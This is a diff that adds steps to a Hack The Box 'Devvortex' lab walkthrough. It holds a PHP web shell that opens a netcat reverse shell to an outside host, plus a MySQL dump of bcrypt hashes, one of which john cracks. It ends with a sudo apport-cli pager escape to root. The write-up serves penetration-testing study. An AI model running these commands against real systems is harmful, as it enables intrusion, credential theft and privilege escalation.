@@ -97,3 +97,73 @@ DB name: joomla
 DB prefix: sd4fg_
 DB encryption 0
 ```
+
+
+we can connect with user lewis and password of database (reuse of credentials)\
+<img width="1252" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/6ae88f75-f380-48a4-b4ac-176b4d23c6d9">
+
+<img width="1231" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/888a43ec-371a-40ba-8ef3-04c39e748903">
+<?php
+system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.42 6666 >/tmp/f');
+?>
+
+──(parallels㉿kali)-[~]
+└─$ nc -lvnp 6666  
+listening on [any] 6666 ...
+connect to [10.10.15.42] from (UNKNOWN) [10.10.11.242] 44636
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@devvortex:~/dev.devvortex.htb$ ^Z
+zsh: suspended  nc -lvnp 6666
+                                                                                                                                                   
+┌──(parallels㉿kali)-[~]
+└─$ stty raw -echo;fg              
+[1]  + continued  nc -lvnp 6666
+
+www-data@devvortex:~/dev.devvortex.htb$
+
+
+
+www-data@devvortex:/home/logan$ mysql -h localhost -u lewis -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2732
+Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+
+
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
++----------+--------------------------------------------------------------+
+
+
+
+┌──(parallels㉿kali)-[~]
+└─$ john hash_logan --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tequieromucho    (logan)     
+1g 0:00:00:20 DONE (2023-11-27 21:05) 0.04930g/s 69.23p/s 69.23c/s 69.23C/s moises..harry
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+
+Sudo on /usr/bin/apport-cli
+
+if we do a report on a PID, the binary use less by default pager\
+since we sudo, we can get a bash shell by doing !bash when paging.
